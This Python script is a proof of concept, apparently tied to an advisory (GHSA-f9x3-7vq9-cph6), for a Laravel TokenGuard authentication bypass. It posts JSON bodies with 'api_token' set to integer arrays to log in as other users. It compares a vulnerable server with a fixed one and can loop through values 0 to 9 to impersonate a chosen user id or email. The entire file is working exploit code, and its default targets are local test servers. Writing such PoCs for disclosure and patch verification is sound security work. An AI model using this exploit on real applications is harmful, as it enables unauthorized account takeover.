#!/usr/bin/env python3
import argparse
import http.client
import json
import logging
import sys
import time
import urllib.parse

BANNER = """
_____________________________________________________________________________________
______  ___  _________ ___ ____  _____
___  / / /_/   |___/ //_/_/   |__/   _/ / Laravel TokenGuard Auth Bypass            /
__  /_/ /__ /| |__  , <__  /| |  _/ /  /                                           /
_  __  /_  ___ |_  /| |_  ___ |__/ /  /     Laravel <= 13.26.x                     /
/_/ /_/ /_/  |_|/_/ |_|/_/  |_|/___/ /       https://hakaisecurity.io              /
________________________________________________________________________________"""

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger("poc")

print(BANNER)
parser = argparse.ArgumentParser(description="GHSA-f9x3-7vq9-cph6 PoC")
parser.add_argument("vuln_url", nargs="?", default="http://127.0.0.1:8891")
parser.add_argument("fixed_url", nargs="?", default="http://127.0.0.1:8892")
parser.add_argument("--proxy", help="inspection proxy (Burp/mitmproxy), e.g. 127.0.0.1:8080")
parser.add_argument("--target", type=int, help="target user id; enumerates api_token [0..9]")
parser.add_argument("--targetUser", help="target user email; enumerates api_token [0..9]")
args = parser.parse_args()

vuln_url = args.vuln_url
fixed_url = args.fixed_url

user_token = "b7f9d2c4a8e6b1f3d5a0c9e2b4d6f8a1c"


def post(base_url, payload):
    target = urllib.parse.urlsplit(base_url)
    if args.proxy:
        proxy = urllib.parse.urlsplit(args.proxy if "//" in args.proxy else f"http://{args.proxy}")
        connection = http.client.HTTPConnection(proxy.hostname, proxy.port or 8080)
        path = f"http://{target.netloc}/"
        headers = {"Host": target.netloc, "Content-Type": "application/json"}
    else:
        connection = http.client.HTTPConnection(target.hostname, target.port)
        path = "/"
        headers = {"Content-Type": "application/json"}
    started = time.perf_counter()
    connection.request("POST", path, body=json.dumps(payload), headers=headers)
    response = connection.getresponse()
    raw = response.read().decode()
    elapsed_ms = (time.perf_counter() - started) * 1000
    connection.close()
    try:
        parsed = json.loads(raw) if raw else {}
    except json.JSONDecodeError:
        parsed = {}
    return response.status, parsed, elapsed_ms


def exploit_line(app, base_url, payload):
    status, body, elapsed_ms = post(base_url, payload)
    who = body.get("authenticated_as", body.get("error", "-"))
    via = f" via {args.proxy}" if args.proxy else ""
    log.info("[*] %s POST %s -> %s %s (%d ms)%s",
             app, json.dumps(payload), status, who, elapsed_ms, via)


def probe_target():
    for n in range(10):
        payload = {"api_token": [n]}
        status, body, elapsed_ms = post(vuln_url, payload)
        who = body.get("authenticated_as", body.get("error", "-"))
        uid = body.get("user_id", "-")
        hit = (args.target is not None and body.get("user_id") == args.target) or \
              (args.targetUser is not None and who == args.targetUser)
        log.info('[*] probe {"api_token": [%d]} -> %s %s id=%s%s',
                 n, status, who, uid, " <- target" if hit else "")
        if hit:
            return
    log.info("target not found in [0..9]")


probes = [
    ("vuln ", vuln_url, {"api_token": [0]}),
    ("vuln ", vuln_url, {"api_token": user_token}),
    ("fixed", fixed_url, {"api_token": [0]}),
]

try:
    if args.target is not None or args.targetUser:
        probe_target()
    else:
        for app, base_url, payload in probes:
            exploit_line(app, base_url, payload)
except OSError as error:
    log.error("%s (proxy: %s)", error, args.proxy or "direct")
    sys.exit(1)
